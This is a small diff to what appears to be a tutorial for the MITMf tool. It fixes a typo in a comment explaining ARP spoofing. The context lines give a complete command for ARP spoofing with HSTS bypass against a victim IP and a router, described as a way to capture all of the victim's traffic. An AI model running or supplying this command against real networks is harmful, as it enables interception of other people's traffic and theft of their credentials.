@@ -28,7 +28,7 @@ mitm -h
 @@@ Here -i  Is for Interface You may be on LAN the replace wlan0 by eth0:
 @@@ Target is victim IP and  gateway is Router IP so Replace these IPS with Your One's@@@
 
-@@@ --arp is for Address Resolution Protocol We are sppofing atp to get all the traffic between victim and Server @@
+@@@ --arp is for Address Resolution Protocol We are sppofing arp to get all the traffic between victim and Server @@
 @@@ --hsts is for HTTPS  @@@
 
 mitmf -i wlan0 --target 192.168.0.12 --gateway 192.168.0.1 --arp --spoof --hsts
